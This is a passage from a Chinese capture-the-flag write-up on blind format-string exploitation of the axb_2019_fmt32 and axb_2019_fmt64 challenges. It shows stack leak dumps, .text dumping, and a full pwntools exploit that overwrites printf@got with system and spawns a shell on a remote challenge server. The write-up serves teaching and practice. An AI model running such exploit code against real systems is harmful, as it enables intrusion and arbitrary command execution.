0xf7f4d000</span><br><span class="line">[*] 720 0x1       </span><br><span class="line">[*] 724 0x8048500 </span><br><span class="line">[*] 728 (nil)     </span><br><span class="line">[*] 732 0x8048521 </span><br><span class="line">[*] 736 0x80485fb </span><br><span class="line">[*] 740 0x1       </span><br><span class="line">[*] 744 0xff8e48d4</span><br><span class="line">[*] 748 0x8048760 </span><br><span class="line">[*] 752 0x80487c0 </span><br><span class="line">[*] 756 0xf7f38880</span><br><span class="line">[*] 760 0xff8e48cc</span><br><span class="line">[*] 764 0xf7f4d918</span><br><span class="line">[*] 768 0x1       </span><br><span class="line">[*] 772 0xff8e5f37</span><br><span class="line">[*] 776 (nil)     </span><br><span class="line">[*] 780 0xff8e5f41</span><br><span class="line">[*] 784 0xff8e5f57</span><br><span class="line">[*] 788 0xff8e5f5f</span><br><span class="line">[*] 792 0xff8e5f6a</span><br><span class="line">[*] 796 0xff8e5f7f</span><br><span class="line">[*] 800 0xff8e5fc1</span><br><span class="line">[*] 804 0xff8e5fc7</span><br><span class="line">[*] 808 0xff8e5fd5</span><br><span class="line">[*] 812 (nil)     </span><br><span class="line">[*] 816 0x20      </span><br><span class="line">[*] 820 0xf7f28070</span><br><span class="line">[*] 824 0x21      </span><br><span class="line">[*] 828 0xf7f27000</span><br><span class="line">[*] 832 0x10      </span><br><span class="line">[*] 836 0xf8bfbff </span><br><span class="line">[*] 840 0x6       </span><br><span class="line">[*] 844 0x1000    </span><br><span class="line">[*] 848 0x11      </span><br><span class="line">[*] 852 0x64      </span><br><span class="line">[*] 856 0x3       </span><br><span class="line">[*] 860 0x8048034 </span><br><span class="line">[*] 864 0x4       </span><br><span class="line">[*] 868 0x20      </span><br><span class="line">[*] 872 0x5       </span><br><span class="line">[*] 876 0x9       </span><br><span class="line">[*] 880 0x7       </span><br><span class="line">[*] 884 0xf7f29000</span><br><span class="line">[*] 888 0x8       </span><br><span class="line">[*] 892 (nil)     </span><br><span class="line">[*] 896 0x9       </span><br><span class="line">[*] 900 0x8048500 </span><br><span class="line">[*] 904 0xb       </span><br><span class="line">[*] 908 0x3e8     </span><br><span class="line">[*] 912 0xc       </span><br><span class="line">[*] 916 0x3e8     </span><br><span class="line">[*] 920 0xd       </span><br><span class="line">[*] 924 0x3e8     </span><br><span class="line">[*] 928 0xe       </span><br><span class="line">[*] 932 0x3e8     </span><br><span class="line">[*] 936 0x17      </span><br><span class="line">[*] 940 (nil)     </span><br><span class="line">[*] 944 0x19      </span><br><span class="line">[*] 948 0xff8e49ab</span><br><span class="line">[*] 952 0x1a      </span><br><span class="line">[*] 956 (nil)     </span><br><span class="line">[*] 960 0x1f      </span><br><span class="line">[*] 964 0xff8e5fee</span><br><span class="line">[*] 968 0xf       </span><br><span class="line">[*] 972 0xff8e49bb</span><br><span class="line">[*] 976 (nil)     </span><br><span class="line">[*] 980 (nil)     </span><br><span class="line">[*] 984 0x3f000000</span><br><span class="line">[*] 988 0x55b90088</span><br><span class="line">[*] 992 0x5484b0ce</span><br><span class="line">[*] 996 0x96a61291</span><br><span class="line">[*] 1000 0x69827162</span><br><span class="line">[*] 1004 0x363836  </span><br><span class="line">[*] 1008 (nil)     </span><br><span class="line">....... (nil)     </span><br><span class="line">[*] 1112 (nil)</span><br></pre></td></tr></table></figure>
<p>此处我们发现了在泄露序号为700和724的位置出现了相同的明显位于<code>.text</code>段中的相同地址，这就是<code>_start</code>函数的地址。</p>
<p>同时也已经发现了格式化字符串位于288处，即偏移为72，构建偏移，泄露文件。</p>
<p>注意此处因为<code>_start</code>函数地址末尾以<code>x00</code>结尾，那么我们首先先将地址+1，泄露完毕后再手动填入一字节<code>x31</code></p>
<p><strong>IDA文件修复&amp;分析</strong></p>
<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/dm/1024_721_/t01b3d64838d4a94390.png"><img src="%E7%9B%B2%E6%89%93/t01b3d64838d4a94390.png" alt="img"></a></p>
<p>填入偏移，修复<code>_start</code>函数，<code>main</code>函数，反编译。</p>
<p><a target="_blank" rel="noopener" href="https://p2.ssl.qhimg.com/dm/1024_679_/t01c9b164c012ca213c.png"><img src="%E7%9B%B2%E6%89%93/t01c9b164c012ca213c.png" alt="img"></a></p>
<p>我们显然可以确定puts的plt表地址为<code>0x8048470</code></p>
<p><strong>泄露printf的got表地址</strong></p>
<p>我们接下来泄露<code>printf@plt</code>也就是<code>0x8048470</code>处的指令内容，以获取<code>printf@got</code>的位置。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">printf_plt=<span class="number">0x8048470</span></span><br><span class="line">payload = <span class="string">&#x27;Leak--&gt;%78$s&lt;-|&#x27;</span>+p32(printf_plt)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Repeater:Leak--&gt;&#x27;</span>)</span><br><span class="line">print(disasm(sh.recvuntil(<span class="string">&#x27;&lt;-|&#x27;</span>).strip(<span class="string">&#x27;&lt;-|&#x27;</span>)))</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/dm/1024_644_/t01207c89ae56f87a41.png"><img src="%E7%9B%B2%E6%89%93/t01207c89ae56f87a41.png" alt="img"></a></p>
<p><strong>Leak libc &amp; Final exp</strong></p>
<p>现在，我们只需要获取<code>printf@got</code>的内容即可计算出libc基址，并且劫持got表地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26316</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># sh = process(&#x27;../BUUOJ/Pwn/axb_2019_fmt32&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">where_is_start</span>(<span class="params">ret_index=null</span>):</span></span><br><span class="line">    return_addr=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">        payload = <span class="string">&#x27;%%%d$p&lt;--|&#x27;</span> % (i)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;Repeater:&#x27;</span>)</span><br><span class="line">        val = sh.recvuntil(<span class="string">&#x27;&lt;--|&#x27;</span>)</span><br><span class="line">        log.info(<span class="built_in">str</span>(i*<span class="number">4</span>).ljust(<span class="number">4</span>)+<span class="string">&#x27; &#x27;</span>+val.strip(<span class="string">&#x27;&lt;--|&#x27;</span>).ljust(<span class="number">10</span>))</span><br><span class="line">        <span class="keyword">if</span>(i*<span class="number">4</span>==ret_index):</span><br><span class="line">            return_addr=<span class="built_in">int</span>(val.strip(<span class="string">&#x27;&lt;--|&#x27;</span>).ljust(<span class="number">10</span>)[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">return</span> return_addr</span><br><span class="line">        <span class="comment"># sh.recvrepeat(0.2)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_text</span>(<span class="params">start_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    text_segment=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            payload = <span class="string">&#x27;Leak--&gt;%78$s&lt;-|&#x27;</span>+p32(start_addr)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;Repeater:Leak--&gt;&#x27;</span>)</span><br><span class="line">            value = sh.recvuntil(<span class="string">&#x27;&lt;-|&#x27;</span>).strip(<span class="string">&#x27;&lt;-|&#x27;</span>)</span><br><span class="line">            text_segment += value</span><br><span class="line">            start_addr += <span class="built_in">len</span>(value)</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">len</span>(value)==<span class="number">0</span>):</span><br><span class="line">                text_segment += <span class="string">&#x27;x00&#x27;</span></span><br><span class="line">                start_addr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(text_segment[-<span class="number">9</span>:-<span class="number">1</span>]==<span class="string">&#x27;x00&#x27;</span>*<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        log.info(<span class="string">&#x27;We get &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(text_segment)) +<span class="string">&#x27;byte file!&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;axb_2019_fmt32_dump&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fout:</span><br><span class="line">            fout.write(text_segment)</span><br><span class="line"></span><br><span class="line"><span class="comment"># start_addr=where_is_start(700)</span></span><br><span class="line"><span class="comment"># dump_text(0x08048501)</span></span><br><span class="line">printf_plt=<span class="number">0x8048470</span></span><br><span class="line"><span class="comment"># payload = &#x27;Leak--&gt;%78$s&lt;-|&#x27;+p32(printf_plt)</span></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Please tell me:&#x27;)</span></span><br><span class="line"><span class="comment"># sh.sendline(payload)</span></span><br><span class="line"><span class="comment"># sh.recvuntil(&#x27;Repeater:Leak--&gt;&#x27;)</span></span><br><span class="line"><span class="comment"># print(disasm(sh.recvuntil(&#x27;&lt;-|&#x27;).strip(&#x27;&lt;-|&#x27;)))</span></span><br><span class="line">printf_got=<span class="number">0x804a014</span></span><br><span class="line">payload = <span class="string">&#x27;Leak--&gt;%78$s&lt;-|&#x27;</span>+p32(printf_got)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Repeater:Leak--&gt;&#x27;</span>)</span><br><span class="line">printf_addr=u32(sh.recvuntil(<span class="string">&#x27;&lt;-|&#x27;</span>)[:<span class="number">4</span>])</span><br><span class="line">libc_addr=printf_addr-libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_addr=libc_addr+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc base address is &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(libc_addr)))</span><br><span class="line">log.success(<span class="string">&quot;system address is &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line">system_addr_byte_1 = system_addr &amp; <span class="number">0xff</span></span><br><span class="line">system_addr_byte_2 = (system_addr % <span class="number">0xffff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">payload  = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(system_addr_byte_1 - <span class="number">9</span>) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%87$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(system_addr_byte_2 - system_addr_byte_1 + <span class="number">9</span> - <span class="number">0x100</span>) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%88$hn&#x27;</span></span><br><span class="line">payload  = payload.ljust(<span class="number">0x32</span>+<span class="number">1</span>)</span><br><span class="line">payload += p32(printf_got)+p32(printf_got+<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please tell me:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;;/bin/shx00&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment"># print(sh.recv())</span></span><br></pre></td></tr></table></figure>
<h3 id="以axb-2019-fmt64为例"><a href="#以axb-2019-fmt64为例" class="headerlink" title="以axb_2019_fmt64为例"></a>以axb_2019_fmt64为例</h3><p>⚠：本题目在BUUOJ上已被搭建，但是题目给出了源文件，原题为盲打题目，此处也只利用nc接口解题。</p>
<p>题目给了一个txt文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s stilltest</span><br><span class="line"></span><br><span class="line">Symbol table &#39;.dynsym&#39; contains 15 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (2)</span><br><span class="line">     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.2.5 (2)</span><br><span class="line">     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setbuf@GLIBC_2.2.5 (2)</span><br><span class="line">     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND printf@GLIBC_2.2.5 (2)</span><br><span class="line">     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.2.5 (2)</span><br><span class="line">     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND alarm@GLIBC_2.2.5 (2)</span><br><span class="line">     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5 (2)</span><br><span class="line">     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 (2)</span><br><span class="line">     9: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__</span><br><span class="line">    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sprintf@GLIBC_2.2.5 (2)</span><br><span class="line">    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.2.5 (2)</span><br><span class="line">    12: 0000000000601080     8 OBJECT  GLOBAL DEFAULT   26 stdout@GLIBC_2.2.5 (2)</span><br><span class="line">    13: 0000000000601090     8 OBJECT  GLOBAL DEFAULT   26 stdin@GLIBC_2.2.5 (2)</span><br><span class="line">    14: 00000000006010a0     8 OBJECT  GLOBAL DEFAULT   26 stderr@GLIBC_2.2.5 (2)</span><br></pre></td></tr></table></figure>
<p>我们还是先尝试泄露源文件。</p>
<p><strong>Leak Stack &amp; Where is <code>.text</code></strong></p>
<p>这里泄露的数据中出现了大量的<code>(nil)</code>，重复部分已被隐去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">[*] 0    %0$p      </span><br><span class="line">[*] 8    0x1       </span><br><span class="line">[*] 16   0xfffffffffff80000</span><br><span class="line">[*] 24   (nil)     </span><br><span class="line">[*] 32   0xffff    </span><br><span class="line">[*] 40   0x13      </span><br><span class="line">[*] 48   0x7f8314c7d410</span><br><span class="line">[*] 56   0x1315257000</span><br><span class="line">[*] 64   0x7c2d2d3c70243825</span><br><span class="line">[*] 72   0xa       </span><br><span class="line">[*] 80   (nil)     </span><br><span class="line">[*] ..   (nil)   </span><br><span class="line">[*] 312  (nil)     </span><br><span class="line">[*] 320  0x300     </span><br><span class="line">[*] 328  (nil)     </span><br><span class="line">[*] 336  0x7265746165706552</span><br><span class="line">[*] 344  0x2d3c70243334253a</span><br><span class="line">[*] 352  0xa0a7c2d </span><br><span class="line">[*] 360  (nil)     </span><br><span class="line">[*] ...  (nil)</span><br><span class="line">[*] 632  (nil)     </span><br><span class="line">[*] 640  0x7ffc76aacae0</span><br><span class="line">[*] 648  0x3288869db05f6500</span><br><span class="line">[*] 656  0x400970  </span><br><span class="line">[*] 664  0x7f8314c8d830</span><br><span class="line">[*] 672  (nil)     </span><br><span class="line">[*] 680  0x7ffc76aacae8</span><br><span class="line">[*] 688  0x100000000</span><br><span class="line">[*] 696  0x400816  </span><br><span class="line">[*] 704  (nil)     </span><br><span class="line">[*] 712  0x313646518db913f1</span><br><span class="line">[*] 720  0x400720  </span><br><span class="line">[*] 728  0x7ffc76aacae0</span><br><span class="line">[*] 736  (nil)     </span><br><span class="line">[*] 744  (nil)     </span><br><span class="line">[*] 752  0xceceab840b7913f1</span><br><span class="line">[*] 760  0xce306f40308913f1</span><br><span class="line">[*] 768  (nil)     </span><br><span class="line">[*] 776  (nil)     </span><br><span class="line">[*] 784  (nil)     </span><br><span class="line">[*] 792  0x7ffc76aacaf8</span><br><span class="line">[*] 800  0x7f831525e168</span><br><span class="line">[*] 808  0x7f83150477db</span><br><span class="line">[*] 816  (nil)     </span><br><span class="line">[*] 824  (nil)     </span><br><span class="line">[*] 832  0x400720  </span><br><span class="line">[*] 840  0x7ffc76aacae0</span><br><span class="line">[*] 848  (nil)     </span><br><span class="line">[*] 856  0x400749  </span><br><span class="line">[*] 864  0x7ffc76aacad8</span><br><span class="line">[*] 872  0x1c      </span><br><span class="line">[*] 880  0x1       </span><br><span class="line">[*] 888  0x7ffc76aacf37</span><br><span class="line">[*] 896  (nil)     </span><br><span class="line">[*] 904  0x7ffc76aacf41</span><br><span class="line">[*] 912  0x7ffc76aacf57</span><br><span class="line">[*] 920  0x7ffc76aacf5f</span><br><span class="line">[*] 928  0x7ffc76aacf6a</span><br><span class="line">[*] 936  0x7ffc76aacf7f</span><br><span class="line">[*] 944  0x7ffc76aacfc1</span><br><span class="line">[*] 952  0x7ffc76aacfc7</span><br><span class="line">[*] 960  0x7ffc76aacfd5</span><br><span class="line">[*] 968  (nil)     </span><br><span class="line">[*] 976  0x21      </span><br><span class="line">[*] 984  0x7ffc76bcf000</span><br><span class="line">[*] 992  0x10      </span><br><span class="line">[*] 1000 0xf8bfbff </span><br><span class="line">[*] 1008 0x6       </span><br><span class="line">[*] 1016 0x1000    </span><br><span class="line">[*] 1024 0x11      </span><br><span class="line">[*] 1032 0x64      </span><br><span class="line">[*] 1040 0x3       </span><br><span class="line">[*] 1048 0x400040  </span><br><span class="line">[*] 1056 0x4       </span><br><span class="line">[*] 1064 0x38      </span><br><span class="line">[*] 1072 0x5       </span><br><span class="line">[*] 1080 0x9       </span><br><span class="line">[*] 1088 0x7       </span><br><span class="line">[*] 1096 0x7f8315037000</span><br><span class="line">[*] 1104 0x8       </span><br><span class="line">[*] 1112 (nil)     </span><br><span class="line">[*] 1120 0x9       </span><br><span class="line">[*] 1128 0x400720  </span><br><span class="line">[*] 1136 0xb       </span><br><span class="line">[*] 1144 0x3e8     </span><br><span class="line">[*] 1152 0xc       </span><br><span class="line">[*] 1160 0x3e8     </span><br><span class="line">[*] 1168 0xd       </span><br><span class="line">[*] 1176 0x3e8     </span><br><span class="line">[*] 1184 0xe       </span><br><span class="line">[*] 1192 0x3e8     </span><br><span class="line">[*] 1200 0x17      </span><br><span class="line">[*] 1208 (nil)     </span><br><span class="line">[*] 1216 0x19      </span><br><span class="line">[*] 1224 0x7ffc76aacc89</span><br><span class="line">[*] 1232 0x1a      </span><br><span class="line">[*] 1240 (nil)     </span><br><span class="line">[*] 1248 0x1f      </span><br><span class="line">[*] 1256 0x7ffc76aacfee</span><br><span class="line">[*] 1264 0xf       </span><br><span class="line">[*] 1272 0x7ffc76aacc99</span><br><span class="line">[*] 1280 (nil)     </span><br><span class="line">[*] 1288 (nil)     </span><br><span class="line">[*] 1296 (nil)     </span><br><span class="line">[*] 1304 0x88869db05f654f00</span><br><span class="line">[*] 1312 0xf8989b2368cfac32</span><br><span class="line">[*] 1320 0x34365f36387889</span><br><span class="line">[*] 1328 (nil)     </span><br><span class="line">[*] .... (nil) </span><br><span class="line">[*] 1976 (nil)     </span><br><span class="line">[*] 1984 0x2e00000000000000</span><br><span class="line">[*] 1992 0x6e77702f6e77702f</span><br><span class="line">[*] 2000 0x4d414e54534f4800</span><br><span class="line">[*] 2008 0x6162616232313d45</span><br><span class="line">[*] 2016 0x5300623030313137</span><br><span class="line">[*] 2024 0x4800313d4c564c48</span><br><span class="line">[*] 2032 0x6f6f722f3d454d4f</span><br><span class="line">[*] 2040 0x6374652f3d5f0074</span><br><span class="line">[*] 2048 0x2f642e74696e692f</span><br><span class="line">[*] 2056 0x50006474656e6978</span><br><span class="line">[*] 2064 0x7273752f3d485441</span><br><span class="line">[*] 2072 0x732f6c61636f6c2f</span><br><span class="line">[*] 2080 0x7273752f3a6e6962</span><br><span class="line">[*] 2088 0x622f6c61636f6c2f</span><br><span class="line">[*] 2096 0x2f7273752f3a6e69</span><br><span class="line">[*] 2104 0x73752f3a6e696273</span><br><span class="line">[*] 2112 0x732f3a6e69622f72</span><br><span class="line">[*] 2120 0x6e69622f3a6e6962</span><br><span class="line">[*] 2128 0x46002f3d44575000</span><br><span class="line">[*] 2136 0x5f746f6e3d47414c</span><br><span class="line">[*] 2144 0x4d45520067616c66</span><br><span class="line">[*] 2152 0x54534f485f45544f</span><br><span class="line">[*] 2160 0x312e302e3437313d</span><br><span class="line">[*] 2168 0x2f2e003331322e30</span><br><span class="line">[*] 2176 0x6e77702f6e7770</span><br><span class="line">[*] 2184 (nil)</span><br></pre></td></tr></table></figure>
<p>此处我们发现了在泄露序号为720和832的位置出现了相同的明显位于<code>.text</code>段中的相同地址，这就是<code>_start</code>函数的地址。</p>
<p>同时也已经发现了格式化字符串位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] 336  0x7265746165706552  --&gt; retaepeR</span><br><span class="line">[*] 344  0x2d3c70243334253a  --&gt; -&lt;p$34%:</span><br><span class="line">[*] 352  0x000000000a0a7c2d  --&gt; nn|-</span><br></pre></td></tr></table></figure>
<p>此时我们注意到，如果我们先填充7个字节，接下来填充的格式化字符串将位于352的位置上。</p>
<p>那么，我们的格式化字符串位置将实际位于<code>N=44</code>处，即偏移为44，那么我们接下来构建偏移，泄露文件。</p>
<p><strong>Dump <code>.text</code></strong></p>
<p>此处我们首先尝试构建<code>payload = &#39;Leak--&gt;%45$s&lt;-|&#39;+p64(start_addr)</code></p>
<p>发送到远端会发现没有泄露回显，并且远端异常退出了。</p>
<p>正巧BUUOJ给定了源码，我们本地调试一下~</p>
<p>经过调试，发现程序会在我们输入的地址末尾强制加上一个<code>x0a</code>字节，进而会中断在</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movdqu xmm4, XMMWORD PTR [rax] ; &lt;strlen+38&gt;   RAX&#x3D;0x0a400720</span><br></pre></td></tr></table></figure>
<p>进而会导致访址失败。</p>
<p>此时重新看看我们一开始泄露出的数据，仔细观察可以发现，在编号为64（N=8）的位置也有我们输入的格式化字符串，事实上，我们的输入正是从编号64开始，只是会被sprintf函数复制到编号352（N=44）的位置，而在未经过sprintf函数复制时，我们的地址末尾并不会被强制放上<code>x0a</code>，因此，我们构造的payload应当为<code>payload = &#39;Leak---&gt;%10$s&lt;-|&#39;+p64(start_addr)</code>，此时，程序将会从上方未经过sprintf函数的我们的输入处获取的函数地址处获取数据。</p>
<p><strong>IDA文件修复&amp;分析</strong></p>
<p><a target="_blank" rel="noopener" href="https://p0.ssl.qhimg.com/dm/1024_646_/t012d842828b1bfa056.png"><img src="%E7%9B%B2%E6%89%93/t012d842828b1bfa056.png" alt="img"></a></p>
<p>根据前面说明过的_start函数结构，我们可以很方便的找到<code>main</code>函数位置。</p>
<p><a target="_blank" rel="noopener" href="https://p3.ssl.qhimg.com/dm/1024_646_/t01d6712119150c2e56.png"><img src="%E7%9B%B2%E6%89%93/t01d6712119150c2e56.png" alt="img"></a></p>
<p>这里因为setbuf函数分析失败了，我们可以看汇编码推测得出部分函数的名字。</p>
